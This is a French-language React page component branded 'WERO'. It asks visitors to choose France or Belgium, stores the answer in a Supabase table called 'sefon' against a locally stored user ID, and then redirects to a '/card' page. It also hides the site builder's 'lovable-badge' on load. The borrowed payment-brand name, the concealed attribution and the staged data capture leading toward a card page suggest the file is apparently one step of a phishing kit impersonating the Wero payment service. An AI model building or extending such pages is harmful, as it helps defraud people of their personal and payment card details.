import React, { useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { supabase } from "@/lib/supabase";
import { Footer } from "@/components/Footer";
import { useToast } from "@/components/ui/use-toast";

const Country = () => {
  const navigate = useNavigate();
  const { toast } = useToast();

  // Cacher lovable-badge au montage
  useEffect(() => {
    const element = document.getElementById("lovable-badge");
    if (element) {
      element.style.display = "none";
    }
  }, []);

  const handleSelectCountry = async (country: string) => {
    const userId = localStorage.getItem("userId");

    if (!userId) {
      navigate("/");
      return;
    }

    try {
      // Mettre à jour le pays dans la base de données
      await supabase.from("sefon").update({ pays: country }).eq("id", userId);

      // Rediriger vers la page suivante
      navigate("/card");
    } catch (error) {
      console.error(error);
      toast({
        title: "Erreur",
        description: "Une erreur est survenue lors de la mise à jour du pays",
        variant: "destructive",
      });
    }
  };

  return (
    <div className="min-h-screen flex flex-col">
      <header className="bg-yellow-300 p-4">
        <h1 className="text-2xl font-bold">WERO</h1>
      </header>

      <main className="flex-grow flex flex-col justify-center items-center p-4">
        <div className="max-w-md w-full mb-8">
          <h2 className="text-2xl font-bold text-center mb-8">
            Sélectionnez votre pays
          </h2>

          <div className="space-y-4">
            <Button
              onClick={() => handleSelectCountry("France")}
              className="w-full bg-yellow-300 hover:bg-yellow-400 text-black font-semibold py-4 rounded-full"
            >
              France
            </Button>

            <Button
              onClick={() => handleSelectCountry("Belgique")}
              className="w-full bg-yellow-300 hover:bg-yellow-400 text-black font-semibold py-4 rounded-full"
            >
              Belgique
            </Button>
          </div>
        </div>
      </main>

      <Footer />
    </div>
  );
};

export default Country;
